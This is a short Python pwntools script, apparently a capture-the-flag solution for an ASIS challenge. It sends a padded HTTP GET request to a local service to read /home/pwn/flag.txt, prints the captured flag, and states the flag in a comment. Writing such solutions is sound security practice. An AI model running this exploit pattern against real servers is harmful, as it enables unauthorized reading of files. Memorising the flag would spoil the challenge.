from pwn import *

libc = ELF("libc-2.27.so")
HOST = "localhost"
PORT = 9005
p = remote(HOST, PORT)

# Build the payload to grub the flag from the home directory
payload = "GET /" + "a" * 0x100
payload += "\r\n"
payload += 'connection: keep-alive'
payload += "\r\n"
payload += 'a' * 0x800
payload += "/home/pwn/flag.txt"
payload += '\r\n\r\n'

# send the payload to the server
p.send(payload)

# print only the flag without payload
p.recvuntil("ASIS{")
print("Flag --> ASIS{" + p.recvline().strip().decode())

# FLAG --> ASIS{c0mm0n_pr0cfs_l34k+unn0t1c34bl3_f0rm4t_str1ng_bug}
